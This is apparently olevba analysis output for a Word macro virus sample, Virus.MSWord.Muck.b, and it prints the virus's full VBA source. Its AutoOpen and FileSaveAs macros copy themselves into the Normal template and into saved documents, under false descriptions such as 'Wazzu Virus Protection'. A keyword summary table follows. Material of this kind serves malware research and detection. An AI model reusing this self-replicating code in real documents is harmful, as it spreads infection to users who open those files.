olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Muck.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Muck.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Muck.b - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Wazzu Virus Protection.  Used to install the Autoexec macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim ExecuteOnly
On Error Resume Next
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Global:AutoClose", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoNew", "Global:AutoNew", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoExit", "Global:AutoExit", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileSave", "Global:FileSave", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileSaveAs", "Global:FileSaveAs", ExecuteOnly


WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", ExecuteOnly
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", ExecuteOnly
WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", ExecuteOnly
WordBasic.MacroCopy "Global:AutoExit", WordBasic.[FileName$]() + ":AutoExit", ExecuteOnly
WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":FileSave", ExecuteOnly
WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[FileName$]() + ":FileSaveAs", ExecuteOnly
WordBasic.FileSaveAll 1
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.Muck.b - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installed to your NORMAL template as AutoClose to clean the prank macros from any documents that you open then close."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoNew.bas 
in file: ./Virus.MSWord.Muck.b - OLE stream: 'Macros/VBA/AutoNew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "On memo creation set current date and protect header for forms editing"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoNew.MAIN"
WordBasic.SetDocumentVar "MyBkMkNum", "1"
WordBasic.ViewPage
Rem ViewZoomPageWidth
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExit.bas 
in file: ./Virus.MSWord.Muck.b - OLE stream: 'Macros/VBA/AutoExit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "ScanProt macro to protect and disinfect your Normal (Global) template."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExit.MAIN"
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: ./Virus.MSWord.Muck.b - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim ExecuteOnly
On Error Resume Next
WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", ExecuteOnly
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", ExecuteOnly
WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", ExecuteOnly
WordBasic.MacroCopy "Global:AutoExit", WordBasic.[FileName$]() + ":AutoExit", ExecuteOnly
WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":FileSave", ExecuteOnly
WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[FileName$]() + ":FileSaveAs", ExecuteOnly
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
WordBasic.FileSaveAs dlg
WordBasic.FileSaveAs Format:=1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|open                |May open a file                              |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

